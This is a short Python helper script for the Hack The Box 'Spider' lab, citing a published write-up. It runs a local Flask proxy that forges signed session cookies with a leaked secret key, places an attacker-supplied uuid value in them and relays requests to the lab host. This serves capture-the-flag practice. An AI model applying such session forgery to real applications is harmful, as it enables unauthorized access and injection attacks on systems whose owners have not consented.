#!/usr/bin/env python3

######
###### https://0xdf.gitlab.io/2021/10/23/htb-spider.html
##
##

import requests
from flask import Flask, request
from flask.sessions import SecureCookieSessionInterface

app = Flask(__name__)
app.secret_key = "SUPSUPxxxxxXXxxxXxxxxxXxxxXxxxxx"
session_serializer = SecureCookieSessionInterface().get_signing_serializer(app)


@app.route('/')
def main():
    uuid = request.args['uuid']
    if 'url' in request.args:
        url = request.args['url']
    else:
        url = 'http://spider.htb'
    cookie_data = {"uuid": uuid, "username": "", "cart_items": []}
    cookie = {"session": session_serializer.dumps(cookie_data)}
    resp = requests.get(url, cookies=cookie)
    return resp.text


app.run()

##############################
##
##
